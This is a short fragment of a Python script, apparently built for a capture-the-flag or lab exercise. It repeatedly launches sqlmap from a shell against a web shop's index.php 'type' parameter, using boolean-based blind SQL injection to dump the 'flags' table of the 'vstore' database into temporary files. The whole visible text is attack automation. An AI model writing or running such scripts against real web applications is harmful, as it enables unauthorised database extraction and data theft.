...
while True:
    ...
    for i in range(20,0,-1):
        if i==5:
            continue
        try:
            p = subprocess.Popen(f"""python3 sqlmap.py -u "http://10.254.11.2:4001/index.php?page=shop&type=VGA" --technique=B -D vstore -T flags --dump --batch > temp_web{i}.txt""", shell=True)
            sleep(5)            
